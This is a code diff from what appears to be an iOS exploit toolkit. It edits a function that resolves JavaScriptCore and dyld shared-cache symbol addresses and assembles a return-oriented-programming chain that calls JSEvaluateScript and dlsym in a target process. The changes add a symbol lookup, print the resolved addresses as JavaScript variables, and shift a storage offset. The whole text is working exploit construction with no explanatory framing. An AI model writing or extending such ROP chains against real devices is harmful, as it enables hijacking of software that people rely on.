@@ -313,11 +313,16 @@ rop_chain_shit gen_rop_chain(uint32_t base,
 	uint32_t JSGlobalContextCreateInGroup = get_dyld_shc_sym_addr_jsc("JSGlobalContextCreateInGroup");
 	uint32_t JSContextGetGlobalObject = get_dyld_shc_sym_addr_jsc("JSContextGetGlobalObject");
 	uint32_t JSStringCreateWithUTF8CString = get_dyld_shc_sym_addr_jsc("JSStringCreateWithUTF8CString");
+	uint32_t JSObjectGetProperty = get_dyld_shc_sym_addr_jsc("JSObjectGetProperty");
 	uint32_t JSEvaluateScript = get_dyld_shc_sym_addr_jsc("JSEvaluateScript");
 	uint32_t dlsym_ = get_dyld_shc_sym_addr("dlsym");
 
 	MOV_R0(dlsym_);
 	STR_R0(base + reserve_addr + 24);
+
+	fprintf(stderr, "var JSStringCreateWithUTF8CString = 0x%08x;\n"
+					"var JSObjectGetProperty = 0x%08x;\n"
+					"var JSContextGetGlobalObject = 0x%08x;\n", JSStringCreateWithUTF8CString, JSObjectGetProperty, JSContextGetGlobalObject);
 
 //	uint32_t settimeofday = get_dyld_shc_sym_addr("settimeofday");
 
@@ -356,11 +361,11 @@ rop_chain_shit gen_rop_chain(uint32_t base,
 	MOV_R0(0x108000);
 	
 	CALL_SLID(JSStringCreateWithUTF8CString);
-	STR_R0(base + reserve_addr + 0x48);
+	STR_R0(base + reserve_addr + 0x4a);
 	PRINT_STILL_HERE();
-	DEREF_IN_R0(base + reserve_addr + 0x48);
+	DEREF_IN_R0(base + reserve_addr + 0x4a);
 	MOV_R1_R0();
-	CALL_SLID_4_PTRARG_L2_0(JSEvaluateScript, base + reserve_addr + 0x44, base + reserve_addr + 0x48);
+	CALL_SLID_4_PTRARG_L2_0(JSEvaluateScript, base + reserve_addr + 0x44, base + reserve_addr + 0x4a);
 	MOV_R1_R0();
 	PRINT_STILL_HERE();
 
@@ -378,13 +383,13 @@ rop_chain_shit gen_rop_chain(uint32_t base,
 
 	MOV_R0(0x10a000);
 	CALL_SLID(JSStringCreateWithUTF8CString);
-	STR_R0(base + reserve_addr + 0x48);
+	STR_R0(base + reserve_addr + 0x4a);
 	PRINT_STILL_HERE();
 /*
 	DEREF_IN_R0(base + reserve_addr + 0x48);
 	MOV_R1_R0();
 	*/
-	CALL_SLID_4_PTRARG_L2_0(JSEvaluateScript, base + reserve_addr + 0x44, base + reserve_addr + 0x48);
+	CALL_SLID_4_PTRARG_L2_0(JSEvaluateScript, base + reserve_addr + 0x44, base + reserve_addr + 0x4a);
 	MOV_R1_R0();
 	PRINT_STILL_HERE();
 
